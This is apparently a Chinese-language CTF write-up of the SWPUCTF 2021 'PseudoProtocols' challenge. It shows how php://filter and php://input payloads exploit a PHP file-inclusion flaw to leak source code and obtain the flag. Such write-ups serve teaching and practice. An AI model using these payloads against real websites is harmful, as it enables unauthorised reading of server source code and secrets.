---
title: '[SWPUCTF 2021 新生赛]PseudoProtocols'
date: '2025-05-02T17:52:39+08:00'
weight:
draft: false
description: '[SWPUCTF 2021 新生赛]PseudoProtocols'
---

**提示：** hint is hear Can you find out the hint.php?

根据提示，利用任意文件包含漏洞和 PHP 伪协议读取 `hint.php` 的文件源码

```text
?wllm=php://filter/read=convert.base64-encode/resource=hint.php
```

![PixPin_2025-04-30_23-19-40](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-30_23-19-40.2vey9vgpoh.webp)

对 base64 编码的 `hint.php` 进行解码

```text
PD9waHANCi8vZ28gdG8gL3Rlc3QyMjIyMjIyMjIyMjIyLnBocA0KPz4=
```

![PixPin_2025-04-30_23-21-13](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-30_23-21-13.2dowlagtz4.webp)

```php
<?php
//go to /test2222222222222.php
?>
```

根据提示访问 `http://node7.anna.nssctf.cn:24948/test2222222222222.php`

```php
 <?php
ini_set("max_execution_time", "180");
show_source(__FILE__);
include('flag.php');
$a= $_GET["a"];
if(isset($a)&&(file_get_contents($a,'r')) === 'I want flag'){
    echo "success\n";
    echo $flag;
}
?> 
```

当读取文件 `$a` 的内容为 `I want flag` 时会输出 `$flag`，利用 PHP 伪协议绕过

```text
http://node7.anna.nssctf.cn:24948/test2222222222222.php?a=php://input
POST 请求正文：
I want flag
```

> [!ERROR]
> 根据 `test2222222222222.php` 的内容判断 `$flag` 定义在 `flag.php` 中，由于 `index.php` 中存在任意文件包含漏洞，尝试使用 `?wllm=php://filter/read=convert.base64-encode/resource=flag.php` 读取 `flag.php` 的文件源码，输出 `hacker!`，尝试失败。

